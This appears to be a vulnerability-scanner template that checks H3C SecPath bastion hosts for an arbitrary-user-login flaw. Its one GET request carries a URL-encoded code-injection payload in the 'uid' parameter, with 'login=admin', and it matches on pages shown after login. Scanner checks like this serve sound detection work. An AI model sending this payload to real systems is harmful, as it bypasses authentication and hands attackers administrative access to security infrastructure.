id: H3C-SecPath-unauth
info:
  author: Str1am
  name: "H3C-SecPath-\u8FD0\u7EF4\u5BA1\u8BA1\u7CFB\u7EDF(\u5821\u5792\u673A)\u4EFB\
    \u610F\u7528\u6237\u767B\u5F55"
  severity: medium
  tags: SecPath,login
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - profile_view.php
    - index.php?locale=
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin'
